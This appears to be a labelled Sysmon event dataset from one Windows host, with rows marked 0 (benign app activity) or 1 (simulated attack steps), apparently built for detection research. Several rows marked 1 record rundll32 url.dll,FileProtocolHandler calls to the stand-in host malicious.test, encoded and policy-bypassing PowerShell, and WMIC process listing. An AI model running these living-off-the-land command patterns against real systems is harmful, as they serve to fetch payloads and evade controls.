"Process Create: RuleName: - UtcTime: 2025-11-27 15:18:33.525 ProcessGuid: {3a35410f-6bc9-6928-1503-000000000b00} ProcessId: 9248 Image: C:\Program Files\WindowsApps\SpotifyAB.SpotifyMusic_1.277.358.0_x64__zpdnekdrzrea0\Spotify.exe FileVersion: 1.2.77.358 Description: Spotify Product: Spotify Company: Spotify Ltd OriginalFileName: Spotify.exe CommandLine: ""C:\Program Files\WindowsApps\SpotifyAB.SpotifyMusic_1.277.358.0_x64__zpdnekdrzrea0\Spotify.exe"" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --start-stack-profiler --user-data-dir=""C:\Users\Emil Jinu\AppData\Local\Packages\SpotifyAB.SpotifyMusic_zpdnekdrzrea0\LocalCache\Spotify"" --log-severity=disable --user-agent-product=""Chrome/140.0.7339.214 Spotify/1.2.77.358"" --metrics-shmem-handle=3256,i,13222014306386594249,7920046313029713566,524288 --field-trial-handle=3380,i,11187851917105718157,14082820324337086066,262144 --disable-features=BackForwardCache,FullscreenBubbleShowOrigin,HardwareMediaKeyHandling,LensOverlay,PartitionAllocDanglingPtr,PartitionAllocUnretainedDanglingPtr,StorageNotificationService --variations-seed-version --enable-logging=handle --log-file=3572 --mojo-platform-channel-handle=3568 /prefetch:3 CurrentDirectory: C:\Program Files\WindowsApps\SpotifyAB.SpotifyMusic_1.277.358.0_x64__zpdnekdrzrea0\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Medium Hashes: MD5=D1BEADB948B3C4D4E4F3A3AE68849E94,SHA256=A52EB772A2AD99350DDE57945EE991360F17B9E1CB90F43D9E05760A2BE1CCCE,IMPHASH=09B4C703603C5E3B30A5C92907A8E465 ParentProcessGuid: {3a35410f-6bc3-6928-0f03-000000000b00} ParentProcessId: 10472 ParentImage: C:\Program Files\WindowsApps\SpotifyAB.SpotifyMusic_1.277.358.0_x64__zpdnekdrzrea0\Spotify.exe ParentCommandLine: Spotify.exe ParentUser: DESKTOP-EJG8QJC\Emil Jinu",0
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:30:20.362 ProcessGuid: {3a35410f-8aab-6928-6707-000000000b00} ProcessId: 1236 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\CLSID\{7AFDFDDB-F914-11E4-8377-6C3BE50D980C}\InprocServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\FileSyncShell64.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
File created: RuleName: - UtcTime: 2025-11-27 18:03:18.256 ProcessGuid: {3a35410f-9262-6928-4510-000000000b00} ProcessId: 13492 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_3lvcf4zg.f2b.ps1 CreationUtcTime: 2025-11-27 18:03:18.256 User: DESKTOP-EJG8QJC\Emil Jinu,1
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:20:03.972 ProcessGuid: {3a35410f-8842-6928-c606-000000000b00} ProcessId: 11160 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\CLSID\{BBACC218-34EA-4666-9D7A-C78F2274A524}\InprocServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\FileSyncShell64.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
"Process Create: RuleName: - UtcTime: 2025-11-27 15:37:10.473 ProcessGuid: {3a35410f-7026-6928-4c04-000000000b00} ProcessId: 8892 Image: C:\Windows\System32\charmap.exe FileVersion: 5.2.3668.0 Description: Character Map Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: charmap.exe CommandLine: ""C:\Windows\system32\charmap.exe"" CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Medium Hashes: MD5=13EED870BCD8052BCE783B2D931A553A,SHA256=665D0CA155D4DB485A3022692016C8D3A224067550D301913186951252854C35,IMPHASH=191F093436BAEDDF9464CCBEDFB49DA3 ParentProcessGuid: {3a35410f-6605-6928-0f01-000000000b00} ParentProcessId: 4484 ParentImage: C:\Windows\explorer.exe ParentCommandLine: C:\Windows\Explorer.EXE ParentUser: DESKTOP-EJG8QJC\Emil Jinu",0
Registry value set: RuleName: InvDB-CompileTimeClaim EventType: SetValue UtcTime: 2025-11-27 15:50:42.157 ProcessGuid: {3a35410f-656a-6928-3e00-000000000b00} ProcessId: 2740 Image: C:\Windows\System32\svchost.exe TargetObject: \REGISTRY\A\{9309e89c-9321-cf1a-3889-0090faa6586f}\Root\InventoryApplicationFile\spoolsv.exe|1bb2eb6a2f17a3d0\LinkDate Details: 05/26/2104 23:27:28 User: NT AUTHORITY\SYSTEM,0
"Process Create: RuleName: - UtcTime: 2025-11-27 15:10:27.244 ProcessGuid: {3a35410f-69e3-6928-c102-000000000b00} ProcessId: 4472 Image: C:\Windows\System32\taskhostw.exe FileVersion: 10.0.19041.5794 (WinBuild.160101.0800) Description: Host Process for Windows Tasks Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: taskhostw.exe CommandLine: taskhostw.exe CurrentDirectory: C:\Windows\system32\ User: NT AUTHORITY\SYSTEM LogonGuid: {3a35410f-6567-6928-e703-000000000000} LogonId: 0x3E7 TerminalSessionId: 0 IntegrityLevel: System Hashes: MD5=D71630DA4364F89F36B47581D4162639,SHA256=4D84D1DB6C572DA841307B814CCF26478429D3A29F304755CE1BAF110E639F64,IMPHASH=3A0C6863CDE566AF997DB2DEFFF9D924 ParentProcessGuid: {3a35410f-6568-6928-2400-000000000b00} ParentProcessId: 1532 ParentImage: C:\Windows\System32\svchost.exe ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule ParentUser: NT AUTHORITY\SYSTEM",0
Dns query: RuleName: - UtcTime: 2025-11-27 14:59:16.045 ProcessGuid: {3a35410f-6730-6928-c201-000000000b00} ProcessId: 10044 QueryName: yt3.ggpht.com QueryStatus: 0 QueryResults: 142.251.220.97;142.250.206.1;142.250.207.65;142.250.193.161;172.217.24.1;142.251.223.1;142.250.183.129;142.251.43.193;172.217.24.161;142.250.182.65;142.251.222.129;142.251.221.97;142.251.221.193;142.251.223.225;142.250.67.33;142.250.205.1; Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe User: DESKTOP-EJG8QJC\Emil Jinu,0
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:30:18.887 ProcessGuid: {3a35410f-8aaa-6928-6407-000000000b00} ProcessId: 9176 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\WOW6432Node\CLSID\{CB3D0F55-BC2C-4C1A-85ED-23ED75B5106B}\InprocServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\i386\FileSyncShell.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
"Process Create: RuleName: - UtcTime: 2025-11-27 16:51:19.377 ProcessGuid: {3a35410f-8187-6928-8005-000000000b00} ProcessId: 11092 Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe FileVersion: 142.1.84.141 Description: Brave Browser Product: Brave Browser Company: Brave Software, Inc. OriginalFileName: brave.exe CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=utility --utility-sub-type=patch.mojom.FilePatcher --lang=en-US --service-sandbox-type=service --metrics-shmem-handle=6068,i,12428624633257291345,16912263440342609500,524288 --field-trial-handle=2072,i,14525826334230641121,9305465035905981201,262144 --variations-seed-version=main@69c2005032bb14f803911c3458ab063c42bfa450 --trace-process-track-uuid=3190708997556373682 --mojo-platform-channel-handle=6080 /prefetch:8 CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\142.1.84.141\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Low Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E ParentProcessGuid: {3a35410f-8184-6928-7305-000000000b00} ParentProcessId: 13880 ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",0
File created: RuleName: - UtcTime: 2025-11-27 18:00:49.423 ProcessGuid: {3a35410f-91cf-6928-b60d-000000000b00} ProcessId: 7684 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_4qxbu5lm.0jp.ps1 CreationUtcTime: 2025-11-27 18:00:49.423 User: DESKTOP-EJG8QJC\Emil Jinu,1
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:30:33.915 ProcessGuid: {3a35410f-8ab9-6928-7907-000000000b00} ProcessId: 10732 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\CLSID\{BBACC218-34EA-4666-9D7A-C78F2274A524}\InprocServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\FileSyncShell64.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:02:43.862 ProcessGuid: {3a35410f-9243-6928-d70f-000000000b00} ProcessId: 5816 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe FileVersion: 10.0.19041.3996 (WinBuild.160101.0800) Description: Windows PowerShell Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: PowerShell.EXE CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAEUAMQA2ADUAJwA= CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:19:56.016 ProcessGuid: {3a35410f-883b-6928-bf06-000000000b00} ProcessId: 3732 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\CLSID\{C5FF006E-2AE9-408C-B85B-2DFDD5449D9C}\InprocServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\FileSyncShell64.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
Registry value set: RuleName: - EventType: SetValue UtcTime: 2025-11-27 17:30:24.516 ProcessGuid: {3a35410f-8ab0-6928-6f07-000000000b00} ProcessId: 9116 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\lnkfile\shellex\ContextMenuHandlers\ FileSyncEx\(Default) Details: {CB3D0F55-BC2C-4C1A-85ED-23ED75B5106B} User: DESKTOP-EJG8QJC\Emil Jinu,0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:02:15.485 ProcessGuid: {3a35410f-9227-6928-600f-000000000b00} ProcessId: 7876 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe FileVersion: 10.0.19041.3996 (WinBuild.160101.0800) Description: Windows PowerShell Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: PowerShell.EXE CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -ExecutionPolicy Bypass -Command Write-Output 'PS 155'; Start-Sleep -Seconds 1 CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
Dns query: RuleName: - UtcTime: 2025-11-27 15:01:38.096 ProcessGuid: {3a35410f-67b5-6928-1202-000000000b00} ProcessId: 8256 QueryName: stk.hsprotect.net QueryStatus: 0 QueryResults: ::ffff:34.107.199.61; Image: C:\Windows\System32\WWAHost.exe User: DESKTOP-EJG8QJC\Emil Jinu,0
"Process Create: RuleName: - UtcTime: 2025-11-27 15:52:51.112 ProcessGuid: {3a35410f-73d3-6928-d504-000000000b00} ProcessId: 5896 Image: C:\Windows\ImmersiveControlPanel\SystemSettings.exe FileVersion: 10.0.19041.6456 (WinBuild.160101.0800) Description: Settings Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: SystemSettings.exe CommandLine: ""C:\Windows\ImmersiveControlPanel\SystemSettings.exe"" -ServerName:microsoft.windows.immersivecontrolpanel CurrentDirectory: C:\Windows\ImmersiveControlPanel\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Medium Hashes: MD5=BF344C30EEB707BC671E3D1427C58FD7,SHA256=D3A50D173AF5B0FDD44CBFD7BF7C7471A3B8998EB45C9B49AA2F1C98C9D54CA9,IMPHASH=EC87C68A546FB4BDECF11BCB83E7D0E5 ParentProcessGuid: {3a35410f-6567-6928-0d00-000000000b00} ParentProcessId: 848 ParentImage: C:\Windows\System32\svchost.exe ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p ParentUser: NT AUTHORITY\SYSTEM",0
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:28:02.930 ProcessGuid: {3a35410f-8a22-6928-3707-000000000b00} ProcessId: 11032 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\WOW6432Node\CLSID\{5AB7172C-9C11-405C-8DD5-AF20F3606282}\InprocServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\i386\FileSyncShell.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:30:21.707 ProcessGuid: {3a35410f-8aad-6928-6d07-000000000b00} ProcessId: 668 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\WOW6432Node\CLSID\{4410DC33-BC7C-496B-AA84-4AEA3EEE75F7}\InProcServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\i386\FileCoAuthLib.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:20:12.746 ProcessGuid: {3a35410f-884c-6928-db06-000000000b00} ProcessId: 14740 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\WOW6432Node\CLSID\{F241C880-6982-4CE5-8CF7-7085BA96DA5A}\InprocServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\i386\FileSyncShell.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
"Process Create: RuleName: - UtcTime: 2025-11-27 15:34:12.205 ProcessGuid: {3a35410f-6f74-6928-2004-000000000b00} ProcessId: 15248 Image: C:\Program Files\WindowsApps\Microsoft.SkypeApp_15.150.3125.0_x64__kzf8qxf38zg5c\Skype\Skype.exe FileVersion: 8.150.0.125 Description: Skype Product: Skype Company: Skype Technologies S.A. OriginalFileName: Skype.exe CommandLine: ""C:\Program Files\WindowsApps\Microsoft.SkypeApp_15.150.3125.0_x64__kzf8qxf38zg5c\Skype\Skype.exe"" --type=gpu-process --disable-gpu-sandbox --use-gl=disabled --gpu-vendor-id=5140 --gpu-device-id=140 --gpu-sub-system-id=0 --gpu-revision=0 --gpu-driver-version=10.0.19041.5794 --user-data-dir=""C:\Users\Emil Jinu\AppData\Roaming\Microsoft\Skype for Store"" --gpu-preferences=UAAAAAAAAADoAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAAAAAAASAAAAAAAAAAYAAAAAgAAABAAAAAAAAAAGAAAAAAAAAAQAAAAAAAAAAAAAAAOAAAAEAAAAAAAAAABAAAADgAAAAgAAAAAAAAACAAAAAAAAAA= --mojo-platform-channel-handle=1404 --field-trial-handle=2680,i,2587175410229607811,5091320825709026914,131072 --enable-features=WinUseBrowserSpellChecker,WinUseHybridSpellChecker,WinrtGeolocationImplementation --disable-features=SpareRendererForSitePerProcess,WinRetrieveSuggestionsOnlyOnDemand /prefetch:2 CurrentDirectory: C:\Program Files\WindowsApps\Microsoft.SkypeApp_15.150.3125.0_x64__kzf8qxf38zg5c\Skype\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Medium Hashes: MD5=F5FF375756355DA94F7141BF5EAA08A1,SHA256=E6106E44EEA831012595F556A4D6EC10097340FDEE5B4D285A52137337739F3F,IMPHASH=B44711CB15F67FEC59C330BD3736DAC1 ParentProcessGuid: {3a35410f-6ec5-6928-e003-000000000b00} ParentProcessId: 13136 ParentImage: C:\Program Files\WindowsApps\Microsoft.SkypeApp_15.150.3125.0_x64__kzf8qxf38zg5c\Skype\Skype.exe ParentCommandLine: ""C:\Program Files\WindowsApps\Microsoft.SkypeApp_15.150.3125.0_x64__kzf8qxf38zg5c\Skype\Skype.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:06:34.320 ProcessGuid: {3a35410f-932a-6928-ff14-000000000b00} ProcessId: 16028 Image: C:\Windows\System32\rundll32.exe FileVersion: 10.0.19041.5794 (WinBuild.160101.0800) Description: Windows host process (Rundll32) Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: RUNDLL32.EXE CommandLine: ""C:\Windows\system32\rundll32.exe"" shell32.dll,Control_RunDLL hotplug.dll CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=5A43032AEBD51583832EF3E96F5C81DA,SHA256=076592CA1957F8F357CC201F0015072C612F5770AD7DE85F87F254253C754DD7,IMPHASH=F207A867D6098266EE63A3CA677EB0FF ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
"Process Create: RuleName: - UtcTime: 2025-11-27 18:05:07.955 ProcessGuid: {3a35410f-92d3-6928-6613-000000000b00} ProcessId: 15772 Image: C:\Windows\System32\rundll32.exe FileVersion: 10.0.19041.5794 (WinBuild.160101.0800) Description: Windows host process (Rundll32) Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: RUNDLL32.EXE CommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/32 CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=5A43032AEBD51583832EF3E96F5C81DA,SHA256=076592CA1957F8F357CC201F0015072C612F5770AD7DE85F87F254253C754DD7,IMPHASH=F207A867D6098266EE63A3CA677EB0FF ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
File created: RuleName: - UtcTime: 2025-11-27 17:51:25.279 ProcessGuid: {3a35410f-8f9d-6928-a308-000000000b00} ProcessId: 6036 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_bmzbyyyy.xm3.ps1 CreationUtcTime: 2025-11-27 17:51:25.279 User: DESKTOP-EJG8QJC\Emil Jinu,1
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:30:21.694 ProcessGuid: {3a35410f-8aad-6928-6d07-000000000b00} ProcessId: 668 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\WOW6432Node\CLSID\{5AB7172C-9C11-405C-8DD5-AF20F3606282}\InprocServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\i386\FileSyncShell.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:04:01.201 ProcessGuid: {3a35410f-9291-6928-8d11-000000000b00} ProcessId: 6008 Image: C:\Windows\System32\rundll32.exe FileVersion: 10.0.19041.5794 (WinBuild.160101.0800) Description: Windows host process (Rundll32) Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: RUNDLL32.EXE CommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/11 CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=5A43032AEBD51583832EF3E96F5C81DA,SHA256=076592CA1957F8F357CC201F0015072C612F5770AD7DE85F87F254253C754DD7,IMPHASH=F207A867D6098266EE63A3CA677EB0FF ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
Network connection detected: RuleName: - UtcTime: 2025-11-27 18:03:24.845 ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00} ProcessId: 15028 Image: C:\Windows\System32\wbem\WMIC.exe User: DESKTOP-EJG8QJC\Emil Jinu Protocol: udp Initiated: true SourceIsIpv6: false SourceIp: 10.0.2.15 SourceHostname: DESKTOP-EJG8QJC SourcePort: 53809 SourcePortName: - DestinationIsIpv6: false DestinationIp: 1.0.0.1 DestinationHostname: one.one.one.one DestinationPort: 53 DestinationPortName: domain,1
"Process Create: RuleName: - UtcTime: 2025-11-27 17:58:03.317 ProcessGuid: {3a35410f-912b-6928-2c0a-000000000b00} ProcessId: 3124 Image: C:\Windows\System32\wbem\WMIC.exe FileVersion: 10.0.19041.5794 (WinBuild.160101.0800) Description: WMI Commandline Utility Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: wmic.exe CommandLine: ""C:\Windows\System32\Wbem\WMIC.exe"" process list brief CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=EBE8CE528A79B5CC0782E8DFDA250600,SHA256=DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:19:43.910 ProcessGuid: {3a35410f-882f-6928-aa06-000000000b00} ProcessId: 6864 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\WOW6432Node\CLSID\{1BF42E4C-4AF4-4CFD-A1A0-CF2960B8F63E}\InprocServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\i386\FileSyncShell.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
File created: RuleName: DLL UtcTime: 2025-11-27 15:17:53.077 ProcessGuid: {3a35410f-656d-6928-5500-000000000b00} ProcessId: 720 Image: C:\Windows\system32\svchost.exe TargetFilename: C:\Program Files\WindowsApps\Microsoft.WindowsAppRuntime.1.2_2000.802.31.0_x86__8wekyb3d8bbwe\Microsoft.ui.xaml.dll CreationUtcTime: 2025-11-27 15:17:53.077 User: NT AUTHORITY\SYSTEM,0
